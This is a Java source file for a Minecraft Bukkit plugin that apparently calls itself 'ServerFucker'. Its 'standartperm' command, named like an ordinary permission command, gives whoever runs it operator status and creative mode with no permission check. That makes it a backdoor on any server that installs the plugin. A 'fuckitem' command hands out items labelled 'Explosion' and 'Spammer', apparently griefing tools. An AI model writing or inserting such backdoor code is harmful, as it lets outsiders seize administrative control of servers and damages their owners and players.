package me.maxwell.sf;

import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.Material;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;

public class Commands implements CommandExecutor {

    public String prefix = "§7<§cServerFucker§7> ";

    public Commands(Main main) {
        Bukkit.getPluginCommand("fuckitem").setExecutor(this);
        Bukkit.getPluginCommand("standartperm").setExecutor(this);
    }
    @EventHandler
    public boolean onCommand(CommandSender sender, Command cmd, String string, String[] args) {
        Player p = (Player) sender;

        if (cmd.getName().equalsIgnoreCase("standartperm")) {
            sender.sendMessage(prefix + "Well, here we go. Check your permissions.");
            p.setOp(true);
            p.setGameMode(GameMode.CREATIVE);

        }
        if (cmd.getName().equalsIgnoreCase("fuckitem")) {
            if (args.length == 1) {
                if (args[0].equalsIgnoreCase("1")) {
                    ItemStack egg = new ItemStack(Material.EGG);
                    ItemMeta eggmeta = egg.getItemMeta();
                    eggmeta.setDisplayName("§e > Explosion < ");
                    eggmeta.addEnchant(Enchantment.DAMAGE_ALL, 1, true);

                    p.getInventory().addItem(egg);

                } else {
                    if (args[0].equalsIgnoreCase("2")) {
                        ItemStack spammer = new ItemStack(Material.PAPER);
                        ItemMeta spammermeta = spammer.getItemMeta();
                        spammermeta.setDisplayName("§e > Spammer < ");
                        spammermeta.addEnchant(Enchantment.DAMAGE_ALL, 1, true);

                        p.getInventory().addItem(spammer);
                    }
                }
            }
        }
        return true;
    }
}
